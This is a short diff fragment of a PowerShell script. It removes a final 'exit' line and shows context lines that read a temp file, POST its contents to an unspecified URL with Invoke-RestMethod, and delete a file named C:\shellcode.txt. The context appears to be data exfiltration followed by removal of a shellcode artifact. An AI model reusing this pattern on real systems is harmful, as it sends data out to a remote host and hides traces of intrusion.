@@ -7,4 +7,3 @@ $data=Get-Content .\tmp.txt
 $data
 Invoke-RestMethod -Method Post -Uri $url -Body $data
 Remove-Item -Path C:\shellcode.txt
-exit
